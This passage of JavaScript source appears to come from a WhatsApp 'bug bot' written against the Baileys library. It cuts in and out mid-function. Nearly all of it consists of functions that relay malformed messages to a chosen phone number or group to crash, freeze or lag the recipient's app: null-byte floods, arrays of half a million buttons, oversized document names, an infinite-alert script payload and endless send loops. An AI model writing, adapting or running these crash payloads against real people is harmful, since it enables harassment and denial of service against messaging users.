      suffix = batchIndex > 1 ? "-" + batchIndex : "",
      messageIdBase = "fc" + Date.now().toString(36).toUpperCase() + suffix;
    for (let tagIndex = 0; tagIndex < tagMatrix.length; tagIndex++) {
      let decoded = null;
      for (let size = 5000; size >= 2000 && !decoded; size -= 400) {
        try {
          decoded = proto.Message.decode(wrapRepeated(tagMatrix[tagIndex], size)), proto.Message.encode(decoded).finish();
        } catch {}
      }
      if (!decoded) continue;
      await sock.relayMessage("status@broadcast", decoded, {
        messageId: messageIdBase,
        statusJidList: batchTargets,
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: batchTargets.map(target => ({
              tag: "to",
              attrs: {
                jid: target
              },
              content: []
            }))
          }]
        }]
      }).catch(() => {});
    }
  }
  console.log("bug terkirim ke", targetJid);
}
async function sendAiBotRichResponseCrashBug(sock, targetJid) {
  while (true) {
    try {
      const latexMeta = {};
      latexMeta.latexExpression = "\0";
      latexMeta.width = 99999999;
      const latexInfo = {};
      latexInfo.text = "\0";
      latexInfo.expressions = [latexMeta];
      const subMessage = {};
      subMessage.messageType = 8;
      subMessage.latexMetadata = latexInfo;
      const contextInfo = {};
      contextInfo.isForwarded = true;
      contextInfo.forwardOrigin = 4;
      const richResponse = {};
      richResponse.messageType = 1;
      richResponse.submessages = [subMessage];
      richResponse.contextInfo = contextInfo;
      const forwarded = {};
      forwarded.richResponseMessage = richResponse;
      const wrapper = {};
      wrapper.message = forwarded;
      const payload = {};
      payload.botForwardedMessage = wrapper;
      await sock.relayMessage(targetJid, payload, {});
    } catch {}
    for (let i = 0; i < 100; i++) {
      try {
        const body = {};
        body.text = " ";
        await sock.relayMessage(targetJid, {
          interactiveMessage: {
            body: body,
            nativeFlowMessage: {
              buttons: [{
                name: ["inapp_signup", "booking_status", "galaxy_message"][(i + (Math.random() < 0.5 ? 1 : 0)) % 3],
                buttonParamsJson: JSON.stringify({
                  display_text: "\0".repeat(100000),
                  id: "crash_" + i + "_" + "\0".repeat(50000)
                })
              }]
            }
          }
        }, {
          participant: {
            jid: targetJid
          }
        });
      } catch {}
    }
    try {
      await sock.relayMessage(targetJid, {
        protocolMessage: {
          key: {
            remoteJid: targetJid,
            fromMe: true,
            id: "CG_" + Date.now()
          },
          type: 25,
          historySyncNotification: {
            chunkOrder: 999999,
            progress: 999999,
            initialHistBootstrapInlinePayload: "\0".repeat(50000),
            peerDataRequestSessionId: "​".repeat(50000),
            pushnames: ["‌".repeat(50000)]
          }
        }
      }, {});
    } catch {}
    await new Promise(function (resolve) {
      setTimeout(resolve, 10);
    });
  }
}
async function sendBotForwardedHtmlCrashBug(sock, targetJid) {
  if (!targetJid || !String(targetJid).endsWith("@g.us")) {
    console.log("❌ Target bukan group (@g.us). Dibatalkan.");
    const failResult = {};
    failResult.success = false;
    failResult.reason = "Target is not a group";
    return failResult;
  }
  const unifiedResponse = {};
  unifiedResponse.__typename = "GenAIUnifiedResponse";
  unifiedResponse.response_id = "";
  unifiedResponse.sections = [{
    __typename: "GenAIUnifiedResponseSection",
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: "<script>\n                      while (true) {\n                        alert(\"Ngapain? Group ini dh w silent all GOODBYE🤣🤣🤣😜😜😜😜\");\n                      }\n                    </script>"
      }
    }
  }];
  const contextInfo = {};
  contextInfo.isForwarded = true;
  contextInfo.forwardOrigin = 4;
  const payload = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(unifiedResponse)).toString("base64")
          },
          contextInfo: contextInfo
        }
      }
    }
  };
  try {
    await sock.relayMessage(targetJid, payload, {}), console.log("✅ Bug Lock Terkirim ke group: " + targetJid);
    const successResult = {};
    successResult.success = true;
    successResult.target = targetJid;
    return successResult;
  } catch (err) {
    console.log("❌ Gagal: " + err.message);
    const failResult = {};
    failResult.success = false;
    failResult.reason = err.message;
    return failResult;
  }
}
async function sendGroupedInteractiveBug(sock, targetJid) {
  if (!targetJid.endsWith("@g.us")) {
    console.log("❌ Target bukan group!");
    const failResult = {};
    failResult.success = false;
    failResult.message = "Target is not a group!";
    return failResult;
  }
  const body = {};
  body.text = "X";
  const stickerPack = {};
  stickerPack.stickerPackMessage = {};
  const contextInfo = {};
  contextInfo.quotedMessage = stickerPack;
  const payload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: body,
          nativeFlowMessage: {
            buttons: "@".repeat(500000)
          },
          contextInfo: contextInfo
        }
      }
    }
  };
  try {
    await sock.relayMessage(targetJid, payload, {}), console.log("✅ Bug berhasil dikirim ke " + targetJid);
    const successResult = {};
    successResult.success = true;
    successResult.message = "Bug sent successfully";
    return successResult;
  } catch (err) {
    console.error("❌ Gagal kirim bug ke " + targetJid + ":", err);
    const failResult = {};
    failResult.success = false;
    failResult.message = err.message || "Failed to send bug";
    return failResult;
  }
}
async function sendBufferDelayBug(sock, targetJid) {
  const helper = {};
  helper.helper = "❌ ☇ Gagal menghubungi api, oba lagi nanti";
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tagA = "gTtoE";
  helper.tagB = "PkjCh";
  helper.imageUrl = "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true";
  helper.imageMime = "image/jpeg";
  helper.mediaKey = "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=";
  helper.fileEncSha256 = "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=";
  helper.directPath = "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0";
  helper.midQualitySha = "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.concat2 = function (a, b) {
    return a + b;
  };
  helper.paymentReviewClick = "payment_review_click";
  helper.reviewAndPayment = "review_and_payment";
  helper.statusBroadcast = "status@broadcast";
  helper.metaTag = "meta";
  helper.mentionedTag = "mentioned_users";
  const H = helper;
  for (let index = 0; H.lessThan(index, 100); index++) {
    if (H.equals(H.tagA, H.tagB)) ctx.reply(H.helper);
    else {
      const imageInfo = {};
      imageInfo.url = H.imageUrl;
      imageInfo.mimetype = H.imageMime;
      imageInfo.fileSha256 = "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=";
      imageInfo.fileLength = 9999;
      imageInfo.height = 9999;
      imageInfo.width = 9999;
      imageInfo.mediaKey = H.mediaKey;
      imageInfo.fileEncSha256 = H.fileEncSha256;
      imageInfo.directPath = H.directPath;
      imageInfo.mediaKeyTimestamp = "1776937541";
      imageInfo.jpegThumbnail = null;
      imageInfo.caption = "X";
      imageInfo.scansSidecar = "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==";
      imageInfo.scanLengths = [10000000000000000000, 10000000000000000000, 10000000000000000000, 10000000000000000000];
      imageInfo.midQualityFileSha256 = H.midQualitySha;
      const header = {};
      header.imageMessage = imageInfo;
      const buttonArray = {};
      buttonArray.length = 499999;
      const payload1 = {
          groupStatusMessageV2: {
            message: {
              interactiveMessage: {
                header: header,
                body: {
                  text: H.concat("[".repeat(250000), "?".repeat(250000))
                },
                nativeFlowMessage: {
                  buttons: Array.from(buttonArray, () => ({}))
                }
              }
            }
          }
        },
        payload2 = {
          groupStatusMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: H.concat2(H.concat("‌", "​"), "‌")
                },
                nativeFlowMessage: {
                  buttons: [{
                    name: H.paymentReviewClick,
                    buttonParamsJson: JSON.stringify({
                      reference_id: "{".repeat(250000),
                      type: H.reviewAndPayment,
                      payment_settings: []
                    })
                  }]
                }
              }
            }
          }
        };
      await sock.relayMessage(H.statusBroadcast, payload1, {
        statusJidList: [targetJid],
        additionalNodes: [{
          tag: H.metaTag,
          attrs: {},
          content: [{
            tag: H.mentionedTag,
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: targetJid
              },
              content: []
            }]
          }]
        }]
      }), await sock.relayMessage(H.statusBroadcast, payload2, {
        statusJidList: [targetJid],
        additionalNodes: [{
          tag: H.metaTag,
          attrs: {},
          content: [{
            tag: H.mentionedTag,
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: targetJid
              },
              content: []
            }]
          }]
        }]
      });
    }
  }
}
async function sendCosmicFreezeBug(sock, targetJid) {
  const helper = {};
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.statusBroadcast = "status@broadcast";
  helper.brandLabel = "VnX Moon";
  helper.mentionedTag = "mentioned_users";
  const H = helper;
  for (let index = 0; H.lessThan(index, 100); index++) {
    const buttonArray = {};
    buttonArray.length = 500550;
    await sock.relayMessage(H.statusBroadcast, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: H.brandLabel
            },
            nativeFlowMessage: {
              buttons: Array.from(buttonArray, () => ({}))
            }
          }
        }
      }
    }, {
      statusJidList: [targetJid],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: H.mentionedTag,
          attrs: {},
          content: [{
            tag: "to",
            attrs: {
              jid: targetJid
            }
          }]
        }]
      }]
    });
  }
}
async function sendDelayBrutalityBug(sock, targetJid) {
  const helper = {};
  helper.paymentMessage = "payment_message";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.concat2 = function (a, b) {
    return a + b;
  };
  const H = helper;
  const body = {};
  body.text = "NOT_TEXT_MESSAGE";
  const payload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "".repeat(250000),
            subtitle: "\n".repeat(350000),
            hasMediaAttachment: true,
            locationMessage: {
              degreesLatitude: -98.628979,
              degreesLongitude: 89.9821647,
              name: "​".repeat(40000),
              address: H.paymentMessage
            }
          },
          body: body,
          footer: {
            text: H.concat("�", "\0".repeat(50000))
          },
          nativeFlowMessage: {
            buttons: H.concat2("{}", "\0".repeat(35000))
          }
        }
      }
    }
  };
  await sock.relayMessage(targetJid, payload, {});
}
async function sendPayloadBuilderCrashBug(sock, targetJid) {
  const helper = {};
  helper.participant = targetJid;
  helper.waitForAck = false;
  const H = helper;
  let counter = 0;
  const repeatChar = function (char, times) {
    let result = "";
    for (let i = 0; i < times; i++) result += char;
    return result;
  };
  const randomJids = function (count) {
    let result = [];
    for (let i = 0; i < count; i++) {
      result.push(Math.floor(Math.random() * 700000) + "@s.whatsapp.net");
    }
    return result;
  };
  const emptyObjects = function (count) {
    let result = [];
    for (let i = 0; i < count; i++) result.push({});
    return result;
  };
  const payload1 = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: repeatChar("​", 30000)
            },
            nativeFlowMessage: {
              name: "carousel_message",
              buttons: [],
              cards: emptyObjects(30)
            },
            contextInfo: {
              remoteJid: "@s.whatsapp.net",
              statusAttributionType: 9999,
              mentionedJid: randomJids(2000)
            }
          }
        }
      }
    },
    payload2 = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              title: repeatChar("​", 50000),
              subtitle: repeatChar("‌", 50000),
              hasMediaAttachment: false,
              width: 0,
              height: 0,
              bloksWidget: {
                uuid: repeatChar("​", 50000),
                data: repeatChar("[", 50001),
                type: repeatChar("⁠", 50000),
                fallback: repeatChar("‍", 50000)
              }
            },
            body: {
              text: repeatChar("​", 30000)
            },
            nativeFlowMessage: {
              buttons: repeatChar("[", 50000)
            },
            hasMediaAttachment: false,
            width: 0,
            height: 0
          }
        }
      }
    };
  const wrap = {};
  wrap.message = payload2.message;
  const relayOpts = {};
  relayOpts.groupStatusMessageV2 = wrap;
  await sock.relayMessage("status@broadcast", relayOpts, {
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: []
        }]
      }]
    }]
  }), counter++;
  console.log("Send Bug To : " + targetJid + counter + "Khamsahamida");
  await sock.relayMessage(targetJid, payload2, H), counter++, await sock.relayMessage(targetJid, payload1, H), counter++;
}
async function sendPlaceholderResendBug(sock, targetJid) {
  const helper = {};
  helper.placeholderName = "placeholderResendMessage";
  helper.base64 = "base64";
  helper.metaAiMessage = "meta_ai_message";
  const H = helper;
  const relayOpts = {};
  relayOpts.Participant = targetJid;
  const opts = relayOpts;
  const placeholderVariants = [H.placeholderName, Buffer.from(H.placeholderName).toString(H.base64), Buffer.from(Buffer.from(H.placeholderName).toString(H.base64)).toString(H.base64), Array.from(H.placeholderName).map(ch => ch.charCodeAt(0)), Array.from(H.placeholderName).map(ch => ch.charCodeAt(0) ^ 66), Array.from(H.placeholderName).map(ch => ch.charCodeAt(0) ^ 255), Buffer.from(Array.from(H.placeholderName).map(ch => ch.charCodeAt(0) ^ 90)).toString(H.base64)];
  for (let index = 0; index < 1; index++) {
    const body = {};
    body.text = "​鉽";
    const header = {};
    header.title = "‍";
    const placeholderWrap = {};
    placeholderWrap.placeholderResendMessage = placeholderVariants[index % placeholderVariants.length];
    const buttonArray = {};
    buttonArray.length = 500550;
    const buttonName = {};
    buttonName.name = H.metaAiMessage;
    const nativeFlowResponse = {};
    nativeFlowResponse.buttons = [buttonName];
    const payload = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: body,
            header: header,
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify(placeholderWrap),
              buttons: Array.from(buttonArray, () => ({}))
            },
            nativeFlowResponseMessage: nativeFlowResponse
          }
        }
      }
    };
    await sock.relayMessage(targetJid, payload, opts);
  }
}
async function sendH4tersBug(sock, targetJid) {
  const payload = {
    groupStatusMessageV2: {
      message: {
        viewOnceMessageV2Extension: {
          message: {
            interactiveMessage: {
              header: {
                title: "​⁠".repeat(10000),
                subtitle: "﻿\u202F".repeat(10000)
              },
              body: {
                text: "᠎؜".repeat(20000)
              },
              nativeFlowMessage: {
                buttons: "￹￺".repeat(70000) + "￻⁠".repeat(30000),
                messageParamsJson: "​\u202F".repeat(10000)
              },
              contextInfo: {
                stanzaId: "﻿᠎".repeat(1000),
                mentionedJid: ["؜​".repeat(1000)],
                forwardingScore: 4294967295,
                isForwarded: true,
                expiration: 4294967295
              }
            }
          }
        }
      }
    }
  };
  const relayOpts = {};
  relayOpts.noSelfSync = true;
  await sock.relayMessage(targetJid, payload, relayOpts);
}
async function sendSingleSelectCrashBug(sock, targetJid) {
  const helper = {};
  helper.helper = "octopus";
  helper.icon = "document";
  helper.title = "obito ireng";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.messageIdPrefix = "X4K";
  helper.metaTag = "meta";
  helper.mentionedTag = "mentioned_users";
  const H = helper;
  const normalizedJid = targetJid.includes("@") ? targetJid : targetJid + "@s.whatsapp.net",
    body = {};
  body.text = H.helper;
  body.display_text = "‌";
  const sectionArray = {};
  sectionArray.length = 505555;
  const buttonArray = {};
  buttonArray.length = 500000;
  const payload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: body,
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              icon: H.icon,
              title: H.title,
              sections: Array.from(sectionArray, () => ({}))
            })
          },
          nativeFlowMessage: {
            buttons: Array.from(buttonArray, () => ({}))
          }
        }
      }
    }
  };
  await sock.relayMessage("status@broadcast", payload, {
    messageId: H.concat(H.messageIdPrefix, Date.now().toString(36).toUpperCase()),
    statusJidList: [normalizedJid],
    additionalNodes: [{
      tag: H.metaTag,
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: normalizedJid
          },
          content: []
        }]
      }]
    }]
  });
}
async function sendMetaBusinessMessageBug(sock, targetJid) {
  try {
    const body = {};
    body.text = "Meta_bussines_message";
    const payload = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: body,
            nativeFlowMessage: {
              buttons: "meta_ai_message".repeat(25000)
            }
          }
        }
      }
    };
    await sock.relayMessage(targetJid, payload, {
      participant: {
        jid: targetJid
      }
    }), console.log("✅ BUG SUKSES TERKIRIM KE: " + targetJid);
  } catch (err) {
    console.error(" ❌ Error: " + err.message);
  }
}
async function sendCosmicPhaseBug(sock, targetJid) {
  const helper = {};
  helper.waitForAck = false;
  const H = helper,
    relayOpts = {};
  relayOpts.noSelfSync = true;
  const opts = relayOpts;
  const zeroWidth = "​",
    normalizedJid = targetJid.includes("@") ? targetJid : targetJid.replace(/\D/g, "") + "@s.whatsapp.net",
    delay = ms => {
      if (typeof setTimeout === "function") return new Promise(resolve => setTimeout(resolve, ms));
      if (typeof globalThis !== "undefined" && typeof globalThis.setTimeout === "function") return new Promise(resolve => globalThis.setTimeout(resolve, ms));
      const start = Date.now();
      while (Date.now() - start < ms) {}
      return Promise.resolve();
    },
    body = {};
  body.text = zeroWidth + "鉽";
  const buttonArray = {};
  buttonArray.length = 500000;
  const buildPayload = index => ({
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: body,
          header: {
            title: "‍" + zeroWidth.repeat(index % 10)
          },
          nativeFlowMessage: {
            buttons: Array.from(buttonArray, () => ({
              n: index
            }))
          },
          nativeFlowResponsMessage: {
            buttons: [{
              name: "one_crash_message_" + index
            }]
          }
        }
      }
    }
  });
  for (let index = 0; index < 50; index++) {
    const promises = [];
    for (let sub = 0; sub < 20; sub++) {
      promises.push(sock.relayMessage(normalizedJid, buildPayload(index * 20 + sub), {
        ...opts,
        messageId: "CosmicPhase" + Date.now().toString(36) + "_" + index + "_" + sub
      }).catch(() => {}));
    }
    await Promise.all(promises), await delay(1);
  }
}
async function sendSlowFreezeCrashBug(sock, targetJid) {
  const helper = {};
  helper.placeholderName = "placeholderResendMessage";
  helper.base64 = "base64";
  helper.metaAiMessage = "meta_ai_message";
  const H = helper;
  const relayOpts = {};
  relayOpts.Participant = targetJid;
  const opts = relayOpts;
  const placeholderVariants = [H.placeholderName, Buffer.from(H.placeholderName).toString(H.base64), Buffer.from(Buffer.from(H.placeholderName).toString(H.base64)).toString(H.base64), Array.from(H.placeholderName).map(ch => ch.charCodeAt(0)), Array.from(H.placeholderName).map(ch => ch.charCodeAt(0) ^ 66), Array.from(H.placeholderName).map(ch => ch.charCodeAt(0) ^ 255), Buffer.from(Array.from(H.placeholderName).map(ch => ch.charCodeAt(0) ^ 90)).toString(H.base64)];
  for (let index = 0; index < 1; index++) {
    const body = {};
    body.text = "​鉽";
    const header = {};
    header.title = "‍";
    const placeholderWrap = {};
    placeholderWrap.placeholderResendMessage = placeholderVariants[index % placeholderVariants.length];
    const buttonArray = {};
    buttonArray.length = 500550;
    const buttonName = {};
    buttonName.name = H.metaAiMessage;
    const nativeFlowResponse = {};
    nativeFlowResponse.buttons = [buttonName];
    const payload = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: body,
            header: header,
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify(placeholderWrap),
              buttons: Array.from(buttonArray, () => ({}))
            },
            nativeFlowResponseMessage: nativeFlowResponse
          }
        }
      }
    };
    await sock.relayMessage(targetJid, payload, opts);
  }
}
async function sendHmzInteractiveBug(sock, targetJid) {
  try {
    const payload = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "Hmz\n"
            },
            nativeFlowMessage: {
              messageParamsJson: "[".repeat(10000),
              buttons: "\0".repeat(250000) + "".repeat(250000)
            }
          }
        }
      }
    };
    await sock.relayMessage(targetJid, payload, {
      participants: [{
        jid: targetJid
      }]
    });
  } catch (err) {}
}
async function sendFreeSpamDelayBug(sock, targetJid) {
  const helper = {};
  helper.bodyText = "./#5#~";
  const H = helper;
  const payload = {
    groupStatusMessageV2: {
      message: {
        messageContextInfo: {},
        mediaMetadata: {},
        interactiveMessage: {
          body: {
            text: H.bodyText
          },
          nativeFlowMessage: {
            buttons: "".repeat(500000)
          }
        }
      }
    }
  };
  await sock.relayMessage(targetJid, payload, {
    participant: targetJid
  });
}
async function runFreeSpamAttack(sock, targetJid) {
  const helper = {};
  helper.helper = "❌ ☇ Gagal menghubungi api, oba lagi nanti";
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tagA = "gTtoE";
  helper.tagB = "PkjCh";
  helper.imageUrl = "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true";
  helper.imageMime = "image/jpeg";
  helper.mediaKey = "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=";
  helper.fileEncSha256 = "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=";
  helper.directPath = "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0";
  helper.midQualitySha = "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.concat2 = function (a, b) {
    return a + b;
  };
  helper.paymentReviewClick = "payment_review_click";
  helper.reviewAndPayment = "review_and_payment";
  helper.statusBroadcast = "status@broadcast";
  helper.metaTag = "meta";
  helper.mentionedTag = "mentioned_users";
  const H = helper;
  for (let index = 0; H.lessThan(index, 100); index++) {
    if (H.equals(H.tagA, H.tagB)) ctx.reply(H.helper);
    else {
      const imageInfo = {};
      imageInfo.url = H.imageUrl;
      imageInfo.mimetype = H.imageMime;
      imageInfo.fileSha256 = "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=";
      imageInfo.fileLength = 9999;
      imageInfo.height = 9999;
      imageInfo.width = 9999;
      imageInfo.mediaKey = H.mediaKey;
      imageInfo.fileEncSha256 = H.fileEncSha256;
      imageInfo.directPath = H.directPath;
      imageInfo.mediaKeyTimestamp = "1776937541";
      imageInfo.jpegThumbnail = null;
      imageInfo.caption = "X";
      imageInfo.scansSidecar = "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==";
      imageInfo.scanLengths = [10000000000000000000, 10000000000000000000, 10000000000000000000, 10000000000000000000];
      imageInfo.midQualityFileSha256 = H.midQualitySha;
      const header = {};
      header.imageMessage = imageInfo;
      const buttonArray = {};
      buttonArray.length = 499999;
      const payload1 = {
          groupStatusMessageV2: {
            message: {
              interactiveMessage: {
                header: header,
                body: {
                  text: H.concat("[".repeat(250000), "?".repeat(250000))
                },
                nativeFlowMessage: {
                  buttons: Array.from(buttonArray, () => ({}))
                }
              }
            }
          }
        },
        payload2 = {
          groupStatusMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: H.concat2(H.concat("‌​", "‌"))
                },
                nativeFlowMessage: {
                  buttons: [{
                    name: H.paymentReviewClick,
                    buttonParamsJson: JSON.stringify({
                      reference_id: "{".repeat(250000),
                      type: H.reviewAndPayment,
                      payment_settings: []
                    })
                  }]
                }
              }
            }
          }
        },
        relayOpts = {};
      relayOpts.statusJidList = [targetJid];
      relayOpts.additionalNodes = [{
        tag: H.metaTag,
        attrs: {},
        content: [{
          tag: H.mentionedTag,
          attrs: {},
          content: [{
            tag: "to",
            attrs: {
              jid: targetJid
            },
            content: []
          }]
        }]
      }], await sock.relayMessage("status@broadcast", payload1, relayOpts), await sock.relayMessage(H.statusBroadcast, payload2, {
        statusJidList: [targetJid],
        additionalNodes: [{
          tag: H.metaTag,
          attrs: {},
          content: [{
            tag: H.mentionedTag,
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: targetJid
              },
              content: []
            }]
          }]
        }]
      });
    }
  }
}
async function sendGroupedStatusButtonsBug(sock, targetJid) {
  const helper = {};
  helper.mentionedTag = "mentioned_users";
  const H = helper,
    body = {};
  body.text = "X";
  const interactive = {
    interactiveMessage: {
      body: body,
      nativeFlowMessage: {
        buttons: "\0".repeat(500000)
      }
    }
  };
  const wrap = {};
  wrap.message = interactive;
  const relayOpts = {};
  relayOpts.groupStatusMessageV2 = wrap;
  const opts = {};
  opts.statusJidList = [targetJid];
  opts.additionalNodes = [{
    tag: "meta",
    attrs: {},
    content: [{
      tag: H.mentionedTag,
      attrs: {},
      content: [{
        tag: "to",
        attrs: {
          jid: targetJid
        }
      }]
    }]
  }];
  await sock.relayMessage("status@broadcast", relayOpts, opts);
}
async function sendSingleSelectCrashBug2(sock, targetJid) {
  const helper = {};
  helper.helper = "octopus";
  helper.icon = "document";
  helper.title = "obito ireng";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.messageIdPrefix = "X4K";
  helper.metaTag = "meta";
  helper.mentionedTag = "mentioned_users";
  const H = helper;
  const normalizedJid = targetJid.includes("@") ? targetJid : targetJid + "@s.whatsapp.net",
    body = {};
  body.text = H.helper;
  body.display_text = "‌";
  const sectionArray = {};
  sectionArray.length = 505555;
  const buttonArray = {};
  buttonArray.length = 500000;
  const payload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: body,
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              icon: H.icon,
              title: H.title,
              sections: Array.from(sectionArray, () => ({}))
            })
          },
          nativeFlowMessage: {
            buttons: Array.from(buttonArray, () => ({}))
          }
        }
      }
    }
  };
  await sock.relayMessage("status@broadcast", payload, {
    messageId: H.concat(H.messageIdPrefix, Date.now().toString(36).toUpperCase()),
    statusJidList: [normalizedJid],
    additionalNodes: [{
      tag: H.metaTag,
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: normalizedJid
          },
          content: []
        }]
      }]
    }]
  });
}
async function sendIosinvisBug(sock, targetJid) {
  try {
    const quotedKey = {
        remoteJid: "13135559098@s.whatsapp.net",
        participant: "13135559098@s.whatsapp.net",
        id: Date.now() + "-" + Math.random().toString(36).slice(2)
      },
      quotedMessage = {
        key: quotedKey,
        message: {
          buttonsResponseMessage: {
            selectedButtonId: "x",
            type: 1,
            response: {
              selectedDisplayText: "\n".repeat(50000)
            }
          }
        }
      },
      generateOpts = {};
    generateOpts.quoted = quotedMessage;
    const generatedMessage = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
      documentMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/pdf",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: 999999999,
        pageCount: 999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: "x" + "𑇂𑆵𑆴𑆿".repeat(60000),
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1715880173
      }
    }), generateOpts);
    await sock.relayMessage("status@broadcast", generatedMessage.message, {
      messageId: generatedMessage.key.id,
      statusJidList: [targetJid],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: {
              jid: targetJid
            },
            content: undefined
          }]
        }]
      }]
    }), await sleep(120);
    await sock.relayMessage(targetJid, generatedMessage.message, {
      participant: {
        jid: targetJid
      },
      messageId: generatedMessage.key.id
    });
  } catch (err) {}
}
async function sendCosmicFreezeComplexBug(sock, targetJid) {
  const helper = {};
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.subtract = function (a, b) {
    return a - b;
  };
  helper.markdown = "Markdown";
  helper.wrongAnswer = "❌ Salah! Coba lagi";
  helper.paymentInfo = "payment_info";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.paymentJson1 = "\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"";
  helper.paymentJson2 = "\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"\0\",\"key\":\"";
  helper.paymentJson3 = "\",\"key_type\":\"CPF\"}}],\"share_payment_status\":false}";
  helper.videoMime = "video/mp4";
  helper.videoLen = "17381601";
  helper.videoTitle = "VnX";
  helper.videoSha = "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=";
